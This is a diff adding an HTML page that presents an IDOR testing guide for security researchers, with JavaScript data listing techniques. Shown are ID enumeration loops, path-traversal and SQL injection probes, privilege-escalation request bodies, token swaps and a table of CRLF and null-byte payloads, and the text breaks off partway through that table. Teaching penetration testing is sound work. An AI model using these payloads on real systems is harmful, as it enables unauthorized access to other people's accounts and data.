@@ -1,0 +1,855 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>IDOR Testing Guide</title>
+<link href="https://fonts.googleapis.com/css2?family=Space+Mono:ital,wght@0,400;0,700;1,400&family=Syne:wght@400;600;700;800&display=swap" rel="stylesheet">
+<style>
+:root {
+  --bg: #0a0a0f;
+  --bg2: #0f0f18;
+  --bg3: #141420;
+  --surface: #1a1a2e;
+  --surface2: #1f1f35;
+  --border: rgba(120,120,255,0.12);
+  --border2: rgba(120,120,255,0.25);
+  --accent: #6c63ff;
+  --accent2: #ff6584;
+  --accent3: #43e97b;
+  --accent4: #f9c74f;
+  --accent5: #f72585;
+  --text: #e8e8f0;
+  --text2: #9090b0;
+  --text3: #5a5a7a;
+  --mono: 'Space Mono', monospace;
+  --sans: 'Syne', sans-serif;
+  --red: #ff4d6d;
+  --amber: #f9c74f;
+  --green: #43e97b;
+  --blue: #4cc9f0;
+  --purple: #7b5ea7;
+}
+*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+html { scroll-behavior: smooth; }
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: var(--sans);
+  overflow-x: hidden;
+  min-height: 100vh;
+}
+
+/* === CANVAS BG === */
+#bg-canvas {
+  position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+  z-index: 0; pointer-events: none; opacity: 0.35;
+}
+
+/* === LAYOUT === */
+.page { position: relative; z-index: 1; }
+
+/* === HERO === */
+.hero {
+  min-height: 100vh;
+  display: flex; flex-direction: column; align-items: center; justify-content: center;
+  text-align: center; padding: 2rem;
+  position: relative;
+}
+.hero-badge {
+  font-family: var(--mono); font-size: 11px; letter-spacing: 3px;
+  color: var(--accent); border: 1px solid var(--accent);
+  padding: 4px 14px; border-radius: 99px; margin-bottom: 1.5rem;
+  text-transform: uppercase; animation: fadeInDown 0.8s ease;
+}
+.hero h1 {
+  font-size: clamp(2.8rem, 7vw, 5.5rem);
+  font-weight: 800; line-height: 1.05;
+  background: linear-gradient(135deg, #fff 0%, #c8c8ff 40%, var(--accent) 100%);
+  -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+  background-clip: text; margin-bottom: 1rem;
+  animation: fadeInUp 0.9s ease 0.1s both;
+}
+.hero-sub {
+  font-size: 1.1rem; color: var(--text2); max-width: 560px;
+  line-height: 1.7; margin-bottom: 2.5rem;
+  animation: fadeInUp 0.9s ease 0.2s both;
+}
+.hero-stats {
+  display: flex; gap: 2.5rem; animation: fadeInUp 0.9s ease 0.3s both;
+}
+.hero-stat { text-align: center; }
+.hero-stat .num { font-size: 2rem; font-weight: 800; color: var(--accent); line-height: 1; }
+.hero-stat .lbl { font-family: var(--mono); font-size: 10px; letter-spacing: 2px; color: var(--text3); margin-top: 4px; text-transform: uppercase; }
+.scroll-hint {
+  position: absolute; bottom: 2rem;
+  font-family: var(--mono); font-size: 11px; color: var(--text3); letter-spacing: 2px;
+  animation: bounce 2s infinite;
+}
+
+/* === PHASE NAV === */
+.phase-nav {
+  position: sticky; top: 0; z-index: 100;
+  background: rgba(10,10,15,0.85); backdrop-filter: blur(12px);
+  border-bottom: 1px solid var(--border);
+  padding: 0 2rem; overflow-x: auto;
+}
+.phase-nav-inner {
+  display: flex; gap: 0; max-width: 1200px; margin: 0 auto;
+}
+.phase-nav-btn {
+  flex-shrink: 0;
+  font-family: var(--mono); font-size: 11px; letter-spacing: 1px;
+  color: var(--text3); background: none; border: none;
+  padding: 14px 18px; cursor: pointer;
+  border-bottom: 2px solid transparent;
+  transition: all 0.2s; text-transform: uppercase; white-space: nowrap;
+}
+.phase-nav-btn:hover { color: var(--text); }
+.phase-nav-btn.active { color: var(--accent); border-bottom-color: var(--accent); }
+
+/* === MAIN === */
+.main { max-width: 1200px; margin: 0 auto; padding: 3rem 2rem 6rem; }
+
+/* === PHASE SECTION === */
+.phase-section { margin-bottom: 4rem; scroll-margin-top: 60px; }
+.phase-header {
+  display: flex; align-items: center; gap: 1rem; margin-bottom: 1.5rem;
+}
+.phase-number {
+  font-family: var(--mono); font-size: 11px; letter-spacing: 2px;
+  color: var(--accent); background: rgba(108,99,255,0.12);
+  border: 1px solid rgba(108,99,255,0.3);
+  padding: 3px 10px; border-radius: 4px; flex-shrink: 0;
+}
+.phase-title {
+  font-size: 1.6rem; font-weight: 700; color: var(--text);
+}
+.phase-tag {
+  margin-left: auto; flex-shrink: 0;
+  font-family: var(--mono); font-size: 10px; letter-spacing: 2px;
+  padding: 3px 10px; border-radius: 99px; text-transform: uppercase;
+}
+.tag-critical { background: rgba(255,77,109,0.15); color: var(--red); border: 1px solid rgba(255,77,109,0.3); }
+.tag-attack { background: rgba(255,101,132,0.12); color: var(--accent2); border: 1px solid rgba(255,101,132,0.3); }
+.tag-bypass { background: rgba(249,199,79,0.12); color: var(--amber); border: 1px solid rgba(249,199,79,0.3); }
+.tag-advanced { background: rgba(76,201,240,0.12); color: var(--blue); border: 1px solid rgba(76,201,240,0.3); }
+.tag-recon { background: rgba(67,233,123,0.12); color: var(--green); border: 1px solid rgba(67,233,123,0.3); }
+.tag-automation { background: rgba(123,94,167,0.12); color: #b39ddb; border: 1px solid rgba(123,94,167,0.3); }
+
+/* === TECHNIQUE CARDS GRID === */
+.cards-grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fill, minmax(340px, 1fr));
+  gap: 1rem;
+}
+.technique-card {
+  background: var(--surface);
+  border: 1px solid var(--border);
+  border-radius: 12px;
+  overflow: hidden;
+  transition: transform 0.2s, border-color 0.2s, box-shadow 0.2s;
+  cursor: pointer;
+  position: relative;
+}
+.technique-card::before {
+  content: '';
+  position: absolute; top: 0; left: 0; right: 0; height: 3px;
+  background: var(--card-accent, var(--accent));
+  opacity: 0; transition: opacity 0.2s;
+}
+.technique-card:hover {
+  transform: translateY(-3px);
+  border-color: var(--border2);
+  box-shadow: 0 12px 40px rgba(0,0,0,0.4), 0 0 0 1px var(--border2);
+}
+.technique-card:hover::before { opacity: 1; }
+.technique-card.open { border-color: var(--border2); }
+.technique-card.open::before { opacity: 1; }
+
+.card-head {
+  padding: 14px 16px;
+  display: flex; align-items: center; gap: 10px;
+}
+.card-risk {
+  font-family: var(--mono); font-size: 10px; letter-spacing: 1px;
+  padding: 2px 8px; border-radius: 99px; flex-shrink: 0; text-transform: uppercase;
+}
+.risk-critical { background: rgba(255,77,109,0.2); color: var(--red); }
+.risk-high { background: rgba(255,150,77,0.2); color: #ff964d; }
+.risk-medium { background: rgba(249,199,79,0.2); color: var(--amber); }
+.risk-low { background: rgba(67,233,123,0.2); color: var(--green); }
+.risk-info { background: rgba(76,201,240,0.2); color: var(--blue); }
+
+.card-title { font-size: 14px; font-weight: 600; color: var(--text); flex: 1; line-height: 1.3; }
+.card-toggle {
+  font-family: var(--mono); font-size: 16px; color: var(--text3);
+  transition: transform 0.25s; flex-shrink: 0;
+}
+.technique-card.open .card-toggle { transform: rotate(45deg); color: var(--accent); }
+
+.card-body {
+  display: none; padding: 0 16px 16px;
+  border-top: 1px solid var(--border);
+}
+.technique-card.open .card-body { display: block; }
+.card-desc {
+  font-size: 13px; color: var(--text2); line-height: 1.65;
+  padding-top: 12px; margin-bottom: 10px;
+}
+.card-code {
+  background: var(--bg3); border: 1px solid var(--border);
+  border-radius: 8px; padding: 10px 14px;
+  font-family: var(--mono); font-size: 11px;
+  color: #a8c7ff; line-height: 1.7;
+  white-space: pre; overflow-x: auto;
+}
+.code-comment { color: var(--text3); }
+.code-method { color: #f9c74f; }
+.code-path { color: #a8c7ff; }
+.code-highlight { color: #ff6584; }
+.code-arrow { color: var(--accent3); }
+
+/* === PAYLOAD TABLE === */
+.payload-table {
+  width: 100%; border-collapse: collapse; font-family: var(--mono); font-size: 12px;
+}
+.payload-table th {
+  text-align: left; padding: 8px 12px;
+  color: var(--text3); font-weight: 400; letter-spacing: 1px;
+  border-bottom: 1px solid var(--border); font-size: 10px; text-transform: uppercase;
+}
+.payload-table td {
+  padding: 8px 12px; border-bottom: 1px solid rgba(120,120,255,0.06);
+  color: var(--text2); font-size: 11px; vertical-align: top;
+}
+.payload-table tr:hover td { background: rgba(108,99,255,0.05); }
+.payload-table td:first-child { color: #f9c74f; white-space: nowrap; }
+.payload-table td:last-child { color: #a8c7ff; }
+
+/* === CHECKLIST === */
+.checklist { list-style: none; }
+.checklist li {
+  display: flex; align-items: flex-start; gap: 10px;
+  padding: 10px 0; border-bottom: 1px solid var(--border);
+  font-size: 14px; color: var(--text2); line-height: 1.5;
+}
+.checklist li:last-child { border-bottom: none; }
+.checklist li::before {
+  content: '□'; font-size: 16px; color: var(--accent); flex-shrink: 0; line-height: 1.3;
+}
+input[type=checkbox]:checked + span { text-decoration: line-through; color: var(--text3); }
+
+/* === PRIORITY GUIDE === */
+.priority-list { list-style: none; }
+.priority-item {
+  display: flex; align-items: center; gap: 12px;
+  padding: 12px 16px; margin-bottom: 8px;
+  background: var(--surface); border: 1px solid var(--border);
+  border-radius: 10px; font-size: 14px;
+  transition: border-color 0.15s, transform 0.15s;
+}
+.priority-item:hover { border-color: var(--border2); transform: translateX(4px); }
+.priority-rank {
+  font-family: var(--mono); font-size: 20px; font-weight: 700;
+  min-width: 32px; text-align: center;
+}
+.p1 { color: var(--red); }
+.p2 { color: #ff964d; }
+.p3 { color: var(--amber); }
+.p4 { color: #c8f; }
+.p5 { color: var(--blue); }
+.p6 { color: var(--green); }
+
+/* === TOOL CARDS === */
+.tool-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(260px, 1fr)); gap: 1rem; }
+.tool-card {
+  background: var(--surface); border: 1px solid var(--border);
+  border-radius: 12px; padding: 1rem 1.25rem;
+}
+.tool-name { font-size: 15px; font-weight: 700; color: var(--accent3); margin-bottom: 6px; font-family: var(--mono); }
+.tool-desc { font-size: 13px; color: var(--text2); line-height: 1.6; margin-bottom: 10px; }
+.tool-cmd { background: var(--bg3); border: 1px solid var(--border); border-radius: 6px; padding: 8px 10px; font-family: var(--mono); font-size: 11px; color: #a8c7ff; overflow-x: auto; white-space: pre; }
+
+/* === INFO BOX === */
+.info-box {
+  background: rgba(108,99,255,0.08); border: 1px solid rgba(108,99,255,0.25);
+  border-radius: 10px; padding: 1rem 1.25rem; margin-bottom: 1.5rem;
+  font-size: 13px; color: var(--text2); line-height: 1.6;
+}
+.info-box strong { color: var(--accent); }
+
+/* === SECTION DIVIDER === */
+.divider {
+  border: none; border-top: 1px solid var(--border);
+  margin: 3rem 0;
+}
+
+/* === ANIMATIONS === */
+@keyframes fadeInDown { from { opacity: 0; transform: translateY(-16px); } to { opacity: 1; transform: translateY(0); } }
+@keyframes fadeInUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
+@keyframes bounce { 0%,100% { transform: translateY(0); } 50% { transform: translateY(8px); } }
+
+/* === SCROLLBAR === */
+::-webkit-scrollbar { width: 6px; height: 6px; }
+::-webkit-scrollbar-track { background: var(--bg); }
+::-webkit-scrollbar-thumb { background: var(--surface2); border-radius: 99px; }
+
+/* === ADDITIONAL METHOD BADGE === */
+.new-badge {
+  font-family: var(--mono); font-size: 9px; letter-spacing: 1px;
+  background: rgba(247,37,133,0.2); color: #f72585;
+  border: 1px solid rgba(247,37,133,0.3); border-radius: 99px;
+  padding: 1px 7px; text-transform: uppercase; margin-left: 6px; vertical-align: middle;
+}
+</style>
+</head>
+<body>
+<canvas id="bg-canvas"></canvas>
+<div class="page">
+
+<!-- HERO -->
+<section class="hero">
+  <div class="hero-badge">Security Research Guide</div>
+  <h1>IDOR Testing<br>Masterclass</h1>
+  <p class="hero-sub">Insecure Direct Object Reference vulnerabilities — a complete field guide for ethical security researchers. 12 phases, 80+ techniques.</p>
+  <div class="hero-stats">
+    <div class="hero-stat"><div class="num">12</div><div class="lbl">Phases</div></div>
+    <div class="hero-stat"><div class="num">80+</div><div class="lbl">Techniques</div></div>
+    <div class="hero-stat"><div class="num">20+</div><div class="lbl">Payloads</div></div>
+    <div class="hero-stat"><div class="num">6</div><div class="lbl">Tools</div></div>
+  </div>
+  <div class="scroll-hint">▼ scroll to explore</div>
+</section>
+
+<!-- PHASE NAV -->
+<nav class="phase-nav" id="phaseNav">
+  <div class="phase-nav-inner" id="phaseNavInner"></div>
+</nav>
+
+<!-- MAIN CONTENT -->
+<main class="main" id="mainContent"></main>
+
+</div>
+
+<script>
+// ===================== DATA =====================
+const phases = [
+  {
+    id: 1, label: "Setup", fullLabel: "Setup & Target ID",
+    tag: "Recon", tagClass: "tag-recon",
+    info: "Before any testing, establish proper lab setup. Always use dedicated test accounts — never test on real users.",
+    techniques: [
+      { title: "Create attacker & victim accounts", risk: "critical", riskLabel: "Critical",
+        desc: "Create two separate accounts: one as the 'Attacker' (yours) and one as the 'Victim'. Essential for safely testing destructive operations (POST/PUT/DELETE) without impacting real users.",
+        code: `# Example\nAttacker: attacker@pentest.local  (ID=10)\nVictim:   victim@pentest.local    (ID=9)\n\n# Never use real accounts — always isolated test env` },
+      { title: "Identify JSON API endpoints", risk: "high", riskLabel: "High",
+        desc: "Target JSON REST API endpoints instead of HTML-rendered pages. APIs expose raw object IDs in URLs, query params, and request bodies — making IDOR much easier to exploit.",
+        code: `# Prefer API endpoints:\nGET /api/v1/users/10\nGET /api/v2/orders/4321\n\n# Not rendered HTML (harder):\nGET /dashboard/profile` },
+      { title: "Sensitivity analysis — prioritize targets", risk: "critical", riskLabel: "Critical",
+        desc: "Rank endpoints by impact: password reset > financial data > DMs > account recovery > user management > public data.",
+        code: `# High value targets first:\nPOST /api/reset-password\nGET  /api/invoice/{id}\nGET  /api/messages/{id}\nDEL  /api/account/{id}` },
+      { title: "ID parameter audit", risk: "medium", riskLabel: "Medium",
+        desc: "Hunt for ID parameters in all layers — URL path, query string, JSON body, cookies, headers.",
+        code: `# Check everywhere:\nPath:    /users/{id}\nQuery:   ?user_id=10\nBody:    {"userId": 10}\nCookie:  session_user=10\nHeader:  X-User-ID: 10` },
+      { title: "Find leaked IDs", risk: "high", riskLabel: "High",
+        desc: "IDs often leak from public pages, API responses, emails, Swagger docs, and referrer headers.",
+        code: `# Sources of leaked IDs:\n- Public profile: /u/victim_name\n- API field: {"created_by": 9}\n- Email receipt: order_id=9999\n- Swagger: GET /api-docs\n- JS source files` },
+      { title: "Map all clients", risk: "medium", riskLabel: "Medium",
+        desc: "Decompile mobile apps with jadx/apktool to find hidden API endpoints. Check Swagger/OpenAPI specs. Mobile apps often expose endpoints the web UI hides.",
+        code: `# Tools:\njadx app.apk            # decompile Android\napktool d app.apk        # decode resources\nburp + mobile proxy      # intercept traffic\ncurl /swagger.json       # API spec` },
+    ]
+  },
+  {
+    id: 2, label: "Direct ID", fullLabel: "Direct ID Substitution",
+    tag: "Attack", tagClass: "tag-attack",
+    info: "The most fundamental IDOR technique — directly swap your ID for a victim's ID. Always start here before complex techniques.",
+    techniques: [
+      { title: "Basic ID flip", risk: "critical", riskLabel: "Critical",
+        desc: "The simplest IDOR test: replace your own ID with another user's ID in the URL path.",
+        code: `GET /api/v5/users/10   # your account\n           ↓\nGET /api/v5/users/9    # victim's account` },
+      { title: "Incremental numeric brute force", risk: "critical", riskLabel: "Critical",
+        desc: "Sequentially enumerate IDs by incrementing/decrementing from your own. Works against predictable integer-based IDs.",
+        code: `# Python snippet\nfor uid in range(1, 10000):\n    r = requests.get(\n        f"/api/user/{uid}",\n        headers={"Authorization": token}\n    )\n    if r.status_code == 200:\n        exfiltrate(r.json())` },
+      { title: "Non-numeric ID substitution", risk: "high", riskLabel: "High",
+        desc: "Replace numeric ID with email address, username, or UUID. Some APIs accept multiple identifier formats.",
+        code: `GET /api/users/10\n  → GET /api/users/victim@email.com\n  → GET /api/users/victim_username\n  → GET /api/users/uuid-abc-123` },
+      { title: "Complex ID brute force", risk: "medium", riskLabel: "Medium",
+        desc: "Brute force only the last 1–4 chars of a short alphanumeric ID segment.",
+        code: `# ID pattern: user_XXXX\n# Brute last 4 chars:\nuser_a3f0 ... user_a3fz\nuser_b0a0 ... user_b0az\n\n# Tool: ffuf with charset wordlist` },
+      { title: "Predictable / combined IDs", risk: "medium", riskLabel: "Medium",
+        desc: "When paths contain multiple IDs, change one or both. Check if each part is independently validated.",
+        code: `# Original\n/user/2222/data/3333\n# Tests:\n/user/2222/data/1111  # change resource ID\n/user/9999/data/3333  # change user ID\n/user/9999/data/1111  # change both` },
+      { title: "Hashed / derived IDs", risk: "medium", riskLabel: "Medium",
+        desc: "Detect MD5/SHA-based IDs by creating multiple accounts and observing patterns. Map your IDs to derive victim hashes.",
+        code: `# Observation\nAccount 1: id = md5("user1@x.com")\nAccount 2: id = md5("user2@x.com")\n# Derive:\nVictim hash = md5("victim@x.com")` },
+    ]
+  },
+  {
+    id: 3, label: "URL Bypass", fullLabel: "Path & URL Manipulation",
+    tag: "Bypass", tagClass: "tag-bypass",
+    info: "Manipulate URL structure to bypass authorization checks that rely on exact path matching.",
+    techniques: [
+      { title: "Trailing slash bypass", risk: "medium", riskLabel: "Medium",
+        desc: "Some WAFs and auth layers match exact paths. Adding a trailing slash may route to a different handler that skips the auth check.",
+        code: `GET /api/v5/users/9\n          ↓\nGET /api/v5/users/9/` },
+      { title: "Double slash / obfuscated path", risk: "medium", riskLabel: "Medium",
+        desc: "Double slashes or dot segments can confuse path normalization, routing around auth middleware.",
+        code: `GET /api/v5/users//9\nGET /api/v5/users/./9\nGET /api/v5/users/%2F9\nGET /api//v5//users//9` },
+      { title: "Case variation / key swapping", risk: "medium", riskLabel: "Medium",
+        desc: "Case-sensitive routing can bypass case-insensitive auth checks. Also swap parameter names (user_id ↔ userid ↔ uid).",
+        code: `# Case variation\nGET /api/User?id=123\nGET /api/USER?id=123\n\n# Param name swapping\n?user_id=9  →  ?userid=9\n?uid=9      →  ?account_id=9` },
+      { title: "Path traversal in ID position", risk: "high", riskLabel: "High",
+        desc: "Use ../ to escape your authorized resource scope and reach a victim's resource.",
+        code: `POST /users/delete/10/../9\nPOST /files/10/../../9/secret\nGET  /data/my_id/../../victim_id` },
+      { title: "Wildcard substitution", risk: "low", riskLabel: "Low",
+        desc: "Replace ID with wildcard characters to see if the server returns all records.",
+        code: `GET /api/users/*\nGET /api/users/_\nGET /api/users/%\nGET /api/users/null\nGET /api/users/undefined` },
+      { title: "Fuzz keywords in path", risk: "medium", riskLabel: "Medium",
+        desc: "Replace numeric ID with keywords — some endpoints have undocumented mass-access routes.",
+        code: `GET /api/v3/users/12345\n  → /api/v3/users/all\n  → /api/v3/users/list\n  → /api/v3/users/export\n  → /api/v3/users/admin` },
+      { title: "SQLi quick check", risk: "medium", riskLabel: "Medium",
+        desc: "Append a single quote to the ID — if the app is vulnerable to SQLi, it may return errors or all records.",
+        code: `GET /api/v3/users/12345'\nGET /api/v3/users/12345 OR 1=1--\nGET /api/v3/users/12345' UNION SELECT *--` },
+    ]
+  },
+  {
+    id: 4, label: "Logic Bypass", fullLabel: "Logic & Endpoint Bypasses",
+    tag: "Bypass", tagClass: "tag-bypass",
+    info: "Target application logic flaws — where authorization checks exist but can be sidestepped through version differences, token swaps, or frontend/backend desync.",
+    techniques: [
+      { title: "API version downgrading", risk: "high", riskLabel: "High",
+        desc: "Older API versions often have weaker or missing auth checks. Downgrade from v3 to v1.",
+        code: `GET /v3/user/111   # secured\n         ↓\nGET /v1/user/111   # older, weaker\nGET /v2/user/111   # middle version` },
+      { title: "Sub-endpoint variant", risk: "high", riskLabel: "High",
+        desc: "Full-profile endpoints may be protected, but detail sub-endpoints may not be independently authorized.",
+        code: `GET /api/user/9           # protected\n\n# Try sub-endpoints:\nGET /api/user/9/email\nGET /api/user/9/phone\nGET /api/user/9/address` },
+      { title: "Missing function-level access control", risk: "high", riskLabel: "High",
+        desc: "Frontend hides admin routes — but backend may accept them. Try accessing admin endpoints with a normal user token.",
+        code: `# Admin endpoints accessible to normal users:\nGET /admin/users\nGET /Admin/users       # case bypass\nGET /ADMIN/users\nGET /manage/users\nGET /internal/users` },
+      { title: "Owner flag / role field toggle", risk: "critical", riskLabel: "Critical",
+        desc: "Look for is_admin, owner, role fields in API responses. Try sending those fields in your request to escalate privileges.",
+        code: `# Server response contains:\n{"user_id":10, "is_admin": false}\n\n# Attack: send is_admin=true in body\nPUT /api/profile\nBody: {"is_admin": true, "role": "admin"}` },
+      { title: "Token / authorization swap", risk: "critical", riskLabel: "Critical",
+        desc: "Swap your Bearer token with the victim's token, or test if an API key from one account authorizes actions on another.",
+        code: `# Test: use attacker's token on victim's resource\nAuthorization: Bearer <attacker_token>\nGET /api/user/9   # victim's ID\n\n# If data returns → token not bound to resource` },
+      { title: "Token binding flaw", risk: "critical", riskLabel: "Critical",
+        desc: "Tokens validated for structure/expiry but not bound to a specific resource. Reuse a valid token issued for resource A against resource B.",
+        code: `# Token issued for page_id=A\nPOST /unsubscribe?token=<valid_for_A>&page_id=B\n\n# If unsubscribes page B → token binding flaw!\n# Common in email links, action tokens` },
+      { title: "Frontend–backend desync", risk: "critical", riskLabel: "Critical",
+        desc: "UI hides certain IDs, but backend accepts them without ownership verification. Send hidden IDs via proxy.",
+        code: `# UI shows only your tasks\n# Intercept and modify in Burp:\nPOST /deleteTask\nBody: {"taskId": 11}  # another user's task\n\n# If deleted → backend lacks owner check` },
+      { title: "Cached role / session race", risk: "medium", riskLabel: "Medium",
+        desc: "Auth caches can be stale. Logout and re-login after changing roles, then re-test to find false negatives.",
+        code: `1. Login as admin\n2. Downgrade to normal user\n3. Immediately test admin endpoints\n   → cached role may still apply\n4. Also try concurrent requests` },
+    ]
+  },
+  {
+    id: 5, label: "Param Abuse", fullLabel: "Parameter & Body Abuse",
+    tag: "Attack", tagClass: "tag-attack",
+    info: "Manipulate request parameters and body structures to confuse backend parsing logic.",
+    techniques: [
+      { title: "Add parameter bypass", risk: "high", riskLabel: "High",
+        desc: "Append a user_id parameter to endpoints that don't normally take one — backend may use it to override context.",
+        code: `GET /api/messages\n     ↓\nGET /api/messages?user_id=9\nGET /api/messages?account_id=9\nGET /api/messages?uid=9` },
+      { title: "HTTP Parameter Pollution (HPP)", risk: "high", riskLabel: "High",
+        desc: "Send the same parameter twice. Different servers/frameworks handle duplicates differently — first, last, or both values may be used.",
+        code: `?user_id=10&user_id=9\n\n# PHP: uses last → user_id=9\n# Java: uses first → user_id=10\n# Node: array → [10, 9]` },
+      { title: "JSON array / object wrap", risk: "medium", riskLabel: "Medium",
+        desc: "Wrap the ID value in an array or nested object — parsers may extract differently than expected.",
+        code: `# Array wrap\n{"userid": [9]}\n\n# Nested object\n{"userid": {"userid": 9}}\n\n# JSON param pollution\n{"userid": 10, "userid": 9}` },
+      { title: "Multi-ID / comma separation", risk: "high", riskLabel: "High",
+        desc: "Send multiple IDs in one request — if the server processes all of them, victim data leaks alongside attacker data.",
+        code: `GET /api/users?id=10,9\nGET /api/users?id=10&id=9\n{"ids": [10, 9, 11, 12]}` },
+      { title: "Null termination (%00)", risk: "medium", riskLabel: "Medium",
+        desc: "A null byte may truncate ID matching in some backends, causing them to match a different resource.",
+        code: `GET /api/users/9%00\nGET /api/users/9%00.jpg\n# Body:\n{"user_id": "9\\u0000"}` },
+      { title: "Replace parameter name", risk: "medium", riskLabel: "Medium",
+        desc: "Swap one resource parameter for another — album_id for account_id — to test cross-resource access.",
+        code: `# Original\nGET /api/photos?album_id=10\n\n# Try:\nGET /api/photos?account_id=9\nGET /api/photos?user_id=9\nGET /api/photos?owner_id=9` },
+      { title: "Deserialization / object injection", risk: "critical", riskLabel: "Critical",
+        desc: "Send an object in place of a primitive ID. Servers that blindly deserialize may map to different objects or honor extra fields like role.",
+        code: `# Instead of: user_id=9\n# Send object:\n{"user": {"id": 9, "role": "admin"}}\n\n# Protobuf injection:\n# Replace user_id field with crafted message\n# containing victim ID + elevated role` },
+      { title: "Alternate separators", risk: "low", riskLabel: "Low",
+        desc: "Use non-standard separators in place of commas to confuse parsers.",
+        code: `{"account": "2222;1111"}\n{"account": "2222.1111"}\n{"account": "2222|1111"}\n{"account": "2222 1111"}` },
+    ]
+  },
+  {
+    id: 6, label: "Encoding", fullLabel: "Encoding & Obfuscation",
+    tag: "Bypass", tagClass: "tag-bypass",
+    info: "Encode or obfuscate IDs to bypass validation patterns that check raw values.",
+    techniques: [
+      { title: "Leading zeros", risk: "low", riskLabel: "Low",
+        desc: "Some systems treat '009' as different from '9' at the routing layer but resolve to the same record in the DB.",
+        code: `GET /api/users/9\n  → GET /api/users/09\n  → GET /api/users/009\n  → GET /api/users/0009` },
+      { title: "%20 / whitespace bypass", risk: "low", riskLabel: "Low",
+        desc: "URL-encoded spaces can confuse some regex-based ID validators.",
+        code: `GET /api/users/9%20\nGET /api/users/%209\nGET /api/users/9+0` },
+      { title: "Type confusion (string vs integer)", risk: "medium", riskLabel: "Medium",
+        desc: "Send ID as string when integer expected, or vice versa. Type coercion bugs in some languages can cause mismatches.",
+        code: `# Integer expected, send string:\nGET /api/users/"9"\nGET /api/users/'9'\n{"user_id": "9"}  vs  {"user_id": 9}` },
+      { title: "Base64 decode → modify → re-encode", risk: "high", riskLabel: "High",
+        desc: "Base64-encoded IDs are not encrypted — decode them, change the inner value, re-encode and send.",
+        code: `# Original: MTIzNg==\nbase64_decode("MTIzNg==") → "1236"\n# Modify:\n"1235" → base64_encode → "MTIzNQ=="\n# Send modified value` },
+      { title: "Hex / MD5 / SHA pattern detection", risk: "medium", riskLabel: "Medium",
+        desc: "Identify hash patterns (32-char hex = MD5, 40-char = SHA1). Try crafting known hashes or partial replacements.",
+        code: `# MD5 pattern (32 hex chars):\n5d41402abc4b2a76b9719d911017c592\n# → try: md5("victim@email.com")\n\n# Hex ID:\n0x7B → 123 decimal\n# try: 0x7A (122), 0x7C (124)` },
+      { title: "Unicode / double encoding", risk: "medium", riskLabel: "Medium", isNew: true,
+        desc: "Double URL-encode special chars or use Unicode representations to bypass WAF/auth middleware that decodes only once.",
+        code: `# Double encode:\n/api/users/%252F9     (/ → %2F → %252F)\n/api/users/%2509      (TAB)\n\n# Unicode:\n/api/users/９          (fullwidth 9)` },
+    ]
+  },
+  {
+    id: 7, label: "Protocol", fullLabel: "Protocol & Format Changes",
+    tag: "Bypass", tagClass: "tag-bypass",
+    info: "Switch HTTP methods, content types, or entire protocols — auth checks are often tied to a specific method or format.",
+    techniques: [
+      { title: "Change HTTP method", risk: "high", riskLabel: "High",
+        desc: "Auth middleware often checks methods separately. A protected GET may have an unprotected POST equivalent.",
+        code: `GET  /users/delete/9  → POST /users/delete/9\nDEL  /api/user/9       → GET  /api/user/9\nPOST /get_receipt      → GET  /get_receipt` },
+      { title: "X-HTTP-Method-Override", risk: "high", riskLabel: "High",
+        desc: "Send a POST request with this header to simulate DELETE/PUT — useful when firewalls block those methods.",
+        code: `POST /api/user/9\nX-HTTP-Method-Override: DELETE\n\nPOST /api/user/9\n_method=DELETE     # form-based override` },
+      { title: "Change file type extension", risk: "medium", riskLabel: "Medium",
+        desc: "Some access controls are tied to file extensions. Switch .json to .xml or .txt.",
+        code: `GET /user_data/2341.json\n  → /user_data/2341.xml\n  → /user_data/2341.txt\n  → /user_data/2341.csv\n  → /user_data/2341` },
+      { title: "Change Content-Type", risk: "medium", riskLabel: "Medium",
+        desc: "Switch content type between JSON and form-encoded. Auth may only validate JSON requests properly.",
+        code: `# Original:\nContent-Type: application/json\n{"user_id": 9}\n\n# Switch to:\nContent-Type: application/x-www-form-urlencoded\nuser_id=9\n\n# Or:\nContent-Type: application/xml\n<user_id>9</user_id>` },
+      { title: "gRPC / protobuf endpoint IDOR", risk: "high", riskLabel: "High",
+        desc: "gRPC services often lack the same auth as REST APIs. Test with grpcurl or proxy protobuf traffic.",
+        code: `# grpcurl test:\ngrpcurl -d '{"user_id": 9}' \\\n  target.com:443 \\\n  UserService/GetUser\n\n# Proxy protobuf in Burp:\n# Use Protobuf Decoder extension` },
+      { title: "WebSocket channel IDOR", risk: "high", riskLabel: "High", isNew: true,
+        desc: "Real-time WebSocket/SSE channels named by user ID are often subscribed to without server-side authorization checks.",
+        code: `# Connect to WebSocket\nws = new WebSocket("wss://target.com/ws")\n\n# Subscribe to victim's channel:\nws.send(JSON.stringify({\n  "action": "subscribe",\n  "channel": "user_9"  # victim's ID\n}))` },
+    ]
+  },
+  {
+    id: 8, label: "Payloads", fullLabel: "Injection Bypass Payloads",
+    tag: "Attack", tagClass: "tag-attack",
+    info: "Quick-reference payload table for encoding and injection bypasses. Use these to confuse server-side ID parsing.",
+    isTable: true,
+    payloads: [
+      { variant: "%0d%0a", desc: "CRLF injection in ID", example: '{"id": "2222%0d%0a1111"}' },
+      { variant: "%0a", desc: "Line feed only", example: '{"id": "2222%0a1111"}' },
+      { variant: "%0d", desc: "Carriage return only", example: '{"id": "2222%0d1111"}' },
+      { variant: "%00", desc: "Null byte terminator", example: '{"id": "2222%001111"}' },
+      { variant: ";", desc: "Semicolon separator", example: '{"id": "2222;1111"}' },
+      { variant: ",", desc: "Comma separator", example: '{"id": "2222,1111"}' },
+      { variant: "|", desc: "Pipe char", example: '{"id": "2222|1111"}' },
+      { variant: "&", desc: "Ampersand (HPP)", example: 'id=2222&id=1111' },
+      { variant: "#", desc: "Fragment / comment", example: '{"id": "2222#1111"}' },
+      { variant: "%0a%0dcc:", desc: "Header injection", example: '{"id": "2222%0a%0dcc:1111"}' },
+      { variant: "[]", desc: "Array wrap", example: '{"id": [2222, 1111]}' },
+      { variant: "{}", desc: "Object wrap", example: '{"id": {"id": 1111}}' },
+      { variant: "e+notation", desc: "Float notation", example: '{"id": 9e0}  // = 9' },
